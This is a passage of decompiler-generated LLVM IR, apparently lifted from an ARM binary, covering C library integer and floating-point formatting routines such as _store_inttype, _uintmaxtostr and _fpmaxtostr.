  br i1 %v0_141a8, label %bb11, label %bb12

bb11:                                             ; preds = %bb10
  %v1_141a8 = load i32, i32* %r3.global-to-local, align 4
  %v2_141a8 = load i32, i32* @r4, align 4
  %v3_141a8 = add i32 %v2_141a8, 28
  %v4_141a8 = inttoptr i32 %v3_141a8 to i32*
  store i32 %v1_141a8, i32* %v4_141a8, align 4
  br label %bb12

bb12:                                             ; preds = %bb10, %bb11
  %v2_141ac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_141ac, i32* @r4, align 4
  %v8_141ac = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_141ac

; uselistorder directives
  uselistorder i32 %v3_14194, { 1, 0 }
  uselistorder i32 %v3_14188, { 1, 0 }
  uselistorder i32 %v3_14168, { 1, 0 }
  uselistorder i32 %v2_1416c, { 0, 2, 1 }
  uselistorder i1 %v2_1411c, { 1, 0 }
  uselistorder i32 %v3_14108, { 1, 0 }
  uselistorder i32 %v3_140e0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_1412c, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v3_140d4, { 1, 0 }
  uselistorder i32 %v5_140b8, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 1024, { 0, 13, 14, 2, 15, 1, 16, 17, 18, 4, 11, 12, 3, 7, 8, 6, 9, 5, 10, 19 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %dec_label_pc_14180, { 1, 0 }
  uselistorder label %dec_label_pc_1415c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14144, { 1, 0 }
  uselistorder label %dec_label_pc_140f4, { 1, 0 }
  uselistorder label %dec_label_pc_140e0, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_141b0 = load i32, i32* @r2, align 4
  %v1_141b0 = icmp slt i32 %v0_141b0, 0
  %v0_141b4 = load i32, i32* @r0, align 4
  %v1_141b8 = and i32 %v0_141b4, 2048
  %v2_141ec = icmp eq i32 %v1_141b8, 0
  br i1 %v1_141b0, label %dec_label_pc_141ec, label %dec_label_pc_141c0

dec_label_pc_141c0:                               ; preds = %entry
  br i1 %v2_141ec, label %dec_label_pc_141c8, label %dec_label_pc_141f4

dec_label_pc_141c8:                               ; preds = %dec_label_pc_141c0
  %v7_141c8 = icmp eq i32 %v0_141b4, 256
  %v0_141cc = load i32, i32* @r1, align 4
  %v1_141cc = inttoptr i32 %v0_141cc to i32*
  %v2_141cc = load i32, i32* %v1_141cc, align 4
  %v2_141d0 = urem i32 %v2_141cc, 256
  %v2_141d0.v2_141cc = select i1 %v7_141c8, i32 %v2_141d0, i32 %v2_141cc
  br i1 %v7_141c8, label %.thread, label %dec_label_pc_141d8

dec_label_pc_141d8:                               ; preds = %dec_label_pc_141c8
  %v7_141d8 = icmp eq i32 %v0_141b4, 512
  br i1 %v7_141d8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_141d8
  %v4_141e0 = urem i32 %v2_141d0.v2_141cc, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_141d8, %dec_label_pc_141c8, %bb
  %v1_141e8 = phi i32 [ %v2_141cc, %dec_label_pc_141d8 ], [ %v2_141d0, %dec_label_pc_141c8 ], [ %v4_141e0, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_141e8

dec_label_pc_141ec:                               ; preds = %entry
  br i1 %v2_141ec, label %dec_label_pc_141fc, label %dec_label_pc_141f4

dec_label_pc_141f4:                               ; preds = %dec_label_pc_141c0, %dec_label_pc_141ec
  %v0_141f4 = load i32, i32* @r1, align 4
  %v1_141f4 = inttoptr i32 %v0_141f4 to i32*
  %v2_141f4 = load i32, i32* %v1_141f4, align 4
  %v3_141f4 = add i32 %v0_141f4, 4
  %v4_141f4 = inttoptr i32 %v3_141f4 to i32*
  %v5_141f4 = load i32, i32* %v4_141f4, align 4
  store i32 %v5_141f4, i32* @r1, align 4
  ret i32 %v2_141f4

dec_label_pc_141fc:                               ; preds = %dec_label_pc_141ec
  %v7_141fc = icmp eq i32 %v0_141b4, 256
  %v0_14200 = load i32, i32* @r1, align 4
  %v1_14200 = inttoptr i32 %v0_14200 to i32*
  %v2_14200 = load i32, i32* %v1_14200, align 4
  %v2_14204 = urem i32 %v2_14200, 256
  %v2_14204.v2_14200 = select i1 %v7_141fc, i32 %v2_14204, i32 %v2_14200
  br i1 %v7_141fc, label %.thread2, label %dec_label_pc_1420c

dec_label_pc_1420c:                               ; preds = %dec_label_pc_141fc
  %v7_1420c = icmp eq i32 %v0_141b4, 512
  br i1 %v7_1420c, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_1420c
  %v4_14210 = mul i32 %v2_14204.v2_14200, 65536
  %v4_14214 = sdiv i32 %v4_14210, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1420c, %dec_label_pc_141fc, %bb5
  %v0_14218 = phi i32 [ %v2_14200, %dec_label_pc_1420c ], [ %v2_14204, %dec_label_pc_141fc ], [ %v4_14214, %bb5 ]
  %v3_14218 = ashr i32 %v0_14218, 31
  store i32 %v3_14218, i32* @r1, align 4
  ret i32 %v0_14218

; uselistorder directives
  uselistorder i32 %v0_14218, { 1, 0 }
  uselistorder i32 %v2_14204, { 1, 0 }
  uselistorder i32 %v2_14200, { 1, 2, 0 }
  uselistorder i32 %v2_141d0, { 1, 0 }
  uselistorder i32 %v2_141cc, { 1, 2, 0 }
  uselistorder i1 %v2_141ec, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_141f4, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg3 to i8
  %tmp2 = ptrtoint i8* %arg1 to i32
  %v7_14220 = icmp eq i32 %arg2, 256
  br i1 %v7_14220, label %dec_label_pc_1424c, label %dec_label_pc_14228

dec_label_pc_14228:                               ; preds = %entry
  %v7_14228 = icmp eq i32 %arg2, 2048
  br i1 %v7_14228, label %dec_label_pc_14230, label %dec_label_pc_14238

dec_label_pc_14230:                               ; preds = %dec_label_pc_14228
  %tmp3 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp3, align 4
  %v5_14230 = add i32 %tmp2, 4
  %v6_14230 = inttoptr i32 %v5_14230 to i32*
  store i32 %arg4, i32* %v6_14230, align 4
  ret i32 %tmp2

dec_label_pc_14238:                               ; preds = %dec_label_pc_14228
  %v7_14238 = icmp eq i32 %arg2, 512
  %v4_1423c = sdiv i32 %arg3, 256
  store i32 %v4_1423c, i32* @ip, align 4
  br i1 %v7_14238, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_14238
  %tmp4 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp4, align 4
  ret i32 %tmp2

.thread:                                          ; preds = %dec_label_pc_14238
  %v1_14248 = trunc i32 %v4_1423c to i8
  %v4_14248 = add i32 %tmp2, 1
  %v5_14248 = inttoptr i32 %v4_14248 to i8*
  store i8 %v1_14248, i8* %v5_14248, align 1
  br label %dec_label_pc_1424c

dec_label_pc_1424c:                               ; preds = %entry, %.thread
  store i8 %tmp, i8* %arg1, align 1
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %v4_1423c, { 1, 0 }
  uselistorder i32 %tmp2, { 4, 1, 0, 2, 3 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i8* %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1424c, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg4, i32* %r7.global-to-local, align 4
  %v1_14258 = icmp slt i32 %arg4, 0
  %v2_14258 = icmp eq i32 %arg4, 0
  store i1 %v2_14258, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v1_14258, label %dec_label_pc_14270, label %dec_label_pc_14290

dec_label_pc_14270:                               ; preds = %entry
  %v1_14270 = icmp slt i32 %arg3, 0
  %v2_14270 = icmp eq i32 %arg3, 0
  store i1 %v2_14270, i1* %cpsr_z.global-to-local, align 1
  %v1_14274 = sub i32 0, %arg4
  store i32 %v1_14274, i32* %r7.global-to-local, align 4
  br i1 %v1_14270, label %dec_label_pc_1427c, label %dec_label_pc_14290

dec_label_pc_1427c:                               ; preds = %dec_label_pc_14270
  %v1_14280 = sub i32 0, %arg2
  store i32 %v1_14280, i32* %r5.global-to-local, align 4
  %v2_14280 = icmp eq i32 %arg2, 0
  %v2_14284 = icmp eq i1 %v2_14280, false
  %v5_14284 = sext i1 %v2_14284 to i32
  %v6_14284 = sub i32 %v5_14284, %arg3
  store i32 %v6_14284, i32* %r6.global-to-local, align 4
  %v19_14284 = icmp eq i32 %v6_14284, 0
  store i1 %v19_14284, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14298

dec_label_pc_14290:                               ; preds = %dec_label_pc_14270, %entry
  br label %dec_label_pc_14298

dec_label_pc_14298:                               ; preds = %dec_label_pc_1427c, %dec_label_pc_14290
  %storemerge = phi i8 [ 0, %dec_label_pc_14290 ], [ 1, %dec_label_pc_1427c ]
  store i8 %storemerge, i8* %stack_var_-40, align 1
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_142a0 = load i32, i32* %r7.global-to-local, align 4
  %v2_142a8 = udiv i32 -1, %v0_142a0
  store i32 %v2_142a8, i32* %fp.global-to-local, align 4
  %v2_142b8 = urem i32 -1, %v0_142a0
  %v1_142bc = add i32 %v2_142b8, 1
  store i32 %v1_142bc, i32* %sb.global-to-local, align 4
  %v9_142c0 = icmp eq i32 %v1_142bc, %v0_142a0
  store i1 %v9_142c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_142c0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14298
  %v1_142c4 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_142c4, i32* %sb.global-to-local, align 4
  %v2_142c8 = add i32 %v2_142a8, 1
  store i32 %v2_142c8, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14298, %bb
  %v0_142cc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_142cc, i32* %sl.global-to-local, align 4
  %v0_142d0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_142d0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_142d4

dec_label_pc_142d4thread-pre-split:               ; preds = %bb21
  %v0_142d4.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_142dc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_142d4

dec_label_pc_142d4:                               ; preds = %dec_label_pc_142d4thread-pre-split, %.thread
  %v0_14344 = phi i32 [ %v0_142dc.pre, %dec_label_pc_142d4thread-pre-split ], [ %v0_142a0, %.thread ]
  %v0_142f0 = phi i32 [ %v0_142d4.pr, %dec_label_pc_142d4thread-pre-split ], [ %v0_142cc, %.thread ]
  %v2_142d4 = icmp eq i32 %v0_142f0, 0
  store i1 %v2_142d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_142d4, label %dec_label_pc_14340, label %dec_label_pc_142e4

dec_label_pc_142e4:                               ; preds = %dec_label_pc_142d4
  %v2_142e4 = urem i32 %v0_142f0, %v0_14344
  %v2_142f4 = udiv i32 %v0_142f0, %v0_14344
  store i32 %v2_142f4, i32* %sl.global-to-local, align 4
  %v0_14300 = load i32, i32* %r6.global-to-local, align 4
  %v2_14304 = urem i32 %v0_14300, %v0_14344
  %v1_1430c = load i32, i32* %sb.global-to-local, align 4
  %v3_1430c = mul i32 %v1_1430c, %v2_142e4
  %v4_1430c = add i32 %v3_1430c, %v2_14304
  store i32 %v4_1430c, i32* %r5.global-to-local, align 4
  %v2_14314 = udiv i32 %v0_14300, %v0_14344
  %v0_1431c = load i32, i32* %fp.global-to-local, align 4
  %v3_1431c = mul i32 %v0_1431c, %v2_142e4
  %v4_1431c = add i32 %v3_1431c, %v2_14314
  %v2_14324 = udiv i32 %v4_1430c, %v0_14344
  %v2_1432c = add i32 %v4_1431c, %v2_14324
  br label %dec_label_pc_14360

dec_label_pc_14340:                               ; preds = %dec_label_pc_142d4
  %v0_14340 = load i32, i32* %r6.global-to-local, align 4
  %v2_14358 = udiv i32 %v0_14340, %v0_14344
  br label %dec_label_pc_14360

dec_label_pc_14360:                               ; preds = %dec_label_pc_142e4, %dec_label_pc_14340
  %storemerge24 = phi i32 [ %v2_14358, %dec_label_pc_14340 ], [ %v2_1432c, %dec_label_pc_142e4 ]
  %v0_1437c = phi i32 [ %v2_14358, %dec_label_pc_14340 ], [ %v2_1432c, %dec_label_pc_142e4 ]
  %v1_1437c = phi i32 [ 0, %dec_label_pc_14340 ], [ %v2_142f4, %dec_label_pc_142e4 ]
  %v4_1430c.pn = phi i32 [ %v0_14340, %dec_label_pc_14340 ], [ %v4_1430c, %dec_label_pc_142e4 ]
  store i32 %storemerge24, i32* %r6.global-to-local, align 4
  %v0_14368 = urem i32 %v4_1430c.pn, %v0_14344
  %v3_14360 = load i32, i32* %stack_var_0, align 4
  %v2_14364 = icmp ugt i32 %v0_14368, 8
  %v7_14364 = icmp eq i32 %v0_14368, 9
  store i1 %v7_14364, i1* %cpsr_z.global-to-local, align 1
  %v1_1436c = add i32 %v0_14368, 48
  %v0_14374 = load i32, i32* %r8.global-to-local, align 4
  %v1_14374 = add i32 %v0_14374, -1
  store i32 %v1_14374, i32* %r8.global-to-local, align 4
  %v2_14378 = xor i1 %v7_14364, true
  %v3_14378 = and i1 %v2_14364, %v2_14378
  %extract.t = trunc i32 %v1_1436c to i8
  br i1 %v3_14378, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_14360
  %v2_14368 = add i32 %v3_14360, %v0_14368
  %extract.t8 = trunc i32 %v2_14368 to i8
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_14360, %bb20
  %v0_14380.off0 = phi i8 [ %extract.t, %dec_label_pc_14360 ], [ %extract.t8, %bb20 ]
  %v2_1437c = or i32 %v0_1437c, %v1_1437c
  %v4_1437c = icmp eq i32 %v2_1437c, 0
  store i1 %v4_1437c, i1* %cpsr_z.global-to-local, align 1
  %v3_14380 = inttoptr i32 %v1_14374 to i8*
  store i8 %v0_14380.off0, i8* %v3_14380, align 1
  %v0_14384 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14384, label %dec_label_pc_14388, label %dec_label_pc_142d4thread-pre-split

dec_label_pc_14388:                               ; preds = %bb21
  %v2_14388 = load i8, i8* %stack_var_-40, align 1
  %v2_1438c = icmp eq i8 %v2_14388, 0
  store i1 %v2_1438c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1438c, label %dec_label_pc_14388..thread2_crit_edge, label %bb22

dec_label_pc_14388..thread2_crit_edge:            ; preds = %dec_label_pc_14388
  %v0_14398.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb22:                                             ; preds = %dec_label_pc_14388
  %v3_14394 = load i32, i32* %r8.global-to-local, align 4
  %v4_14394 = add i32 %v3_14394, -1
  %v5_14394 = inttoptr i32 %v4_14394 to i8*
  store i8 45, i8* %v5_14394, align 1
  %v6_14394 = load i32, i32* %r8.global-to-local, align 4
  %v7_14394 = add i32 %v6_14394, -1
  store i32 %v7_14394, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14388..thread2_crit_edge, %bb22
  %v0_14398 = phi i32 [ %v0_14398.pre, %dec_label_pc_14388..thread2_crit_edge ], [ %v7_14394, %bb22 ]
  ret i32 %v0_14398

; uselistorder directives
  uselistorder i32 %v0_14368, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14344, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r7.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 45, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_14360, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_14298, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp151 = call i8 @__decompiler_undefined_function_2()
  %stack_var_-50 = alloca i8, align 1
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-46 = alloca i32, align 4
  %stack_var_-86 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-85 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_143a4 = load i32, i32* @r4, align 4
  store i32 %v3_143a4, i32* %stack_var_-36, align 4
  %v6_143a4 = load i32, i32* @r5, align 4
  %v9_143a4 = load i32, i32* @r6, align 4
  %v12_143a4 = load i32, i32* @r7, align 4
  %v15_143a4 = load i32, i32* @r8, align 4
  %v18_143a4 = load i32, i32* @sb, align 4
  %v1_143ac = add i32 %tmp, 8
  %v2_143ac = inttoptr i32 %v1_143ac to i8*
  %v3_143ac = load i8, i8* %v2_143ac, align 1
  %v4_143ac = zext i8 %v3_143ac to i32
  store i32 %v4_143ac, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %fp.global-to-local, align 4
  %v1_143b4 = or i32 %v4_143ac, 32
  %v2_143b8 = ptrtoint i32* %stack_var_-184 to i32
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_143bc = icmp ult i32 %v1_143b4, 97
  store i1 %v6_143bc, i1* %cpsr_n.global-to-local, align 1
  %v7_143bc = icmp eq i32 %v1_143b4, 97
  store i1 %v7_143bc, i1* %cpsr_z.global-to-local, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  %v2_143c8 = load i32, i32* %arg4, align 4
  store i32 %v2_143c8, i32* %r8.global-to-local, align 4
  br i1 %v7_143bc, label %bb, label %bb180

bb:                                               ; preds = %entry
  %v2_143cc = add nuw nsw i32 %v4_143ac, 6
  store i32 %v2_143cc, i32* %r3.global-to-local, align 4
  br label %bb180

bb180:                                            ; preds = %entry, %bb
  %v1_143e0 = phi i32 [ 101, %entry ], [ %v2_143cc, %bb ]
  store i32 %arg2, i32* %stack_var_-192, align 4
  %v1_143d8 = add i32 %tmp, 12
  %v2_143d8 = inttoptr i32 %v1_143d8 to i32*
  %v3_143d8 = load i32, i32* %v2_143d8, align 4
  store i32 %v3_143d8, i32* %r2.global-to-local, align 4
  %v1_143dc = add i32 %tmp, 4
  %v2_143dc = inttoptr i32 %v1_143dc to i32*
  %v3_143dc = load i32, i32* %v2_143dc, align 4
  store i32 %v3_143dc, i32* %r1.global-to-local, align 4
  br i1 %v7_143bc, label %bb181, label %bb182

bb181:                                            ; preds = %bb180
  %v2_143e0 = urem i32 %v1_143e0, 256
  store i32 %v2_143e0, i32* %r7.global-to-local, align 4
  br label %bb182

bb182:                                            ; preds = %bb180, %bb181
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_143e4 = icmp slt i32 %v2_143c8, 0
  store i1 %v1_143e4, i1* %cpsr_n.global-to-local, align 1
  %v2_143e4 = icmp eq i32 %v2_143c8, 0
  store i1 %v2_143e4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v1_143e4, label %bb183, label %bb184

bb183:                                            ; preds = %bb182
  store i32 6, i32* %r8.global-to-local, align 4
  br label %bb184

bb184:                                            ; preds = %bb182, %bb183
  %v1_143f0 = and i32 %v3_143d8, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_143f0 = icmp eq i32 %v1_143f0, 0
  store i1 %v2_143f0, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-50, align 1
  store i32 %arg1, i32* %stack_var_-192, align 4
  br i1 %v2_143f0, label %dec_label_pc_14404, label %dec_label_pc_14474

dec_label_pc_14404:                               ; preds = %bb184
  %v1_14404 = urem i32 %v3_143d8, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14404 = icmp eq i32 %v1_14404, 0
  store i1 %v2_14404, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14404, label %.thread10, label %dec_label_pc_14474

dec_label_pc_14474:                               ; preds = %dec_label_pc_14404, %bb184
  %storemerge = phi i8 [ 43, %bb184 ], [ 32, %dec_label_pc_14404 ]
  store i8 %storemerge, i8* %stack_var_-50, align 1
  %v2_14478 = add i32 %tmp, 16
  %v3_14478 = inttoptr i32 %v2_14478 to i32*
  store i32 32, i32* %v3_14478, align 4
  %v0_14480 = load i32, i32* %r7.global-to-local, align 4
  %v1_14480 = add i32 %v0_14480, -96
  %v3_14480 = sub i32 95, %v0_14480
  %v4_14480 = and i32 %v3_14480, %v0_14480
  %v5_14480 = icmp slt i32 %v4_14480, 0
  store i1 %v5_14480, i1* %cpsr_v.global-to-local, align 1
  %v6_14480 = icmp slt i32 %v1_14480, 0
  store i1 %v6_14480, i1* %cpsr_n.global-to-local, align 1
  %v7_14480 = icmp eq i32 %v0_14480, 96
  store i1 %v7_14480, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-168, align 4
  %tmp242 = icmp ult i32 %v0_14480, 97
  br i1 %tmp242, label %bb185, label %.thread105

bb185:                                            ; preds = %dec_label_pc_14474
  store i32 12, i32* %r3.global-to-local, align 4
  br label %.thread105

.thread105:                                       ; preds = %dec_label_pc_14474, %bb185
  %v4_14498 = phi i32 [ 12, %bb185 ], [ 3, %dec_label_pc_14474 ]
  %v4_14498..v1_14428 = select i1 %tmp242, i32 %v4_14498, i32 8
  store i32 ptrtoint ([4 x i8]* @global_var_1afec.850 to i32), i32* %r2.global-to-local, align 4
  %v2_144a4 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_144a4, i32* %r6.global-to-local, align 4
  %v2_144a8 = add i32 %v4_14498..v1_14428, ptrtoint ([4 x i8]* @global_var_1afec.850 to i32)
  store i32 %v2_144a8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1492c

.thread10:                                        ; preds = %dec_label_pc_14404
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  %v2_14530 = ptrtoint i32* %stack_var_-85 to i32
  store i32 %v2_14530, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14538

dec_label_pc_14538:                               ; preds = %dec_label_pc_145a8, %.thread10
  %v3_1454c = phi i32 [ %v2_14598, %dec_label_pc_145a8 ], [ %v3_143a4, %.thread10 ]
  %v1_1454c = phi i1 [ %v5_145ac, %dec_label_pc_145a8 ], [ false, %.thread10 ]
  %v0_1454c = phi i1 [ %v6_145ac, %dec_label_pc_145a8 ], [ false, %.thread10 ]
  %v2_1454c = xor i1 %v1_1454c, %v0_1454c
  br i1 %v2_1454c, label %bb187, label %bb186

bb186:                                            ; preds = %dec_label_pc_14538
  %v4_1454c = sub i32 0, %v3_1454c
  store i32 %v4_1454c, i32* %r4.global-to-local, align 4
  br label %bb187

bb187:                                            ; preds = %dec_label_pc_14538, %bb186
  %v0_14550 = phi i32 [ %v3_1454c, %dec_label_pc_14538 ], [ %v4_1454c, %bb186 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14550 = icmp slt i32 %v0_14550, 0
  store i1 %v1_14550, i1* %cpsr_n.global-to-local, align 1
  %v2_14550 = icmp eq i32 %v0_14550, 0
  store i1 %v2_14550, i1* %cpsr_z.global-to-local, align 1
  %v0_1456c = load i32, i32* %sl.global-to-local, align 4
  %v1_1456c = add i32 %v0_1456c, 9
  store i32 %v1_1456c, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14574

dec_label_pc_14574:                               ; preds = %dec_label_pc_14574.dec_label_pc_14574_crit_edge, %bb187
  %v1_14588 = phi i32 [ %v1_14588.pre, %dec_label_pc_14574.dec_label_pc_14574_crit_edge ], [ %v1_1456c, %bb187 ]
  %v0_14580 = phi i32 [ %v0_1459c, %dec_label_pc_14574.dec_label_pc_14574_crit_edge ], [ 0, %bb187 ]
  %v0_1458c = phi i32 [ %v2_14598, %dec_label_pc_14574.dec_label_pc_14574_crit_edge ], [ %v0_14550, %bb187 ]
  %v2_1457c = urem i32 %v0_1458c, 10
  %v1_14580 = add i32 %v0_14580, 1
  store i32 %v1_14580, i32* %r5.global-to-local, align 4
  %v1_14584 = or i32 %v2_1457c, 48
  store i32 %v1_14584, i32* %r2.global-to-local, align 4
  %v2_14588 = sub i32 %v1_14588, %v1_14580
  store i32 %v2_14588, i32* %r3.global-to-local, align 4
  store i32 %v0_1458c, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_14594 = trunc i32 %v1_14584 to i8
  %v3_14594 = inttoptr i32 %v2_14588 to i8*
  store i8 %v1_14594, i8* %v3_14594, align 1
  %v0_14598 = load i32, i32* %r0.global-to-local, align 4
  %v1_14598 = load i32, i32* %r1.global-to-local, align 4
  %v2_14598 = udiv i32 %v0_14598, %v1_14598
  store i32 %v2_14598, i32* %r0.global-to-local, align 4
  %v0_1459c = load i32, i32* %r5.global-to-local, align 4
  %v1_1459c = add i32 %v0_1459c, -8
  %v3_1459c = sub i32 7, %v0_1459c
  %v4_1459c = and i32 %v3_1459c, %v0_1459c
  %v5_1459c = icmp slt i32 %v4_1459c, 0
  store i1 %v5_1459c, i1* %cpsr_v.global-to-local, align 1
  %v6_1459c = icmp slt i32 %v1_1459c, 0
  store i1 %v6_1459c, i1* %cpsr_n.global-to-local, align 1
  %v7_1459c = icmp eq i32 %v0_1459c, 8
  store i1 %v7_1459c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_14598, i32* %r4.global-to-local, align 4
  %v7_145a4 = icmp slt i32 %v0_1459c, 9
  br i1 %v7_145a4, label %dec_label_pc_14574.dec_label_pc_14574_crit_edge, label %dec_label_pc_145a8

dec_label_pc_14574.dec_label_pc_14574_crit_edge:  ; preds = %dec_label_pc_14574
  %v1_14588.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_14574

dec_label_pc_145a8:                               ; preds = %dec_label_pc_14574
  %v0_145a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_145a8 = add i32 %v0_145a8, 1
  store i32 %v1_145a8, i32* %r6.global-to-local, align 4
  %v3_145ac = sub i32 -1, %v0_145a8
  %v4_145ac = and i32 %v1_145a8, %v3_145ac
  %v5_145ac = icmp slt i32 %v4_145ac, 0
  store i1 %v5_145ac, i1* %cpsr_v.global-to-local, align 1
  %v6_145ac = icmp slt i32 %v0_145a8, 0
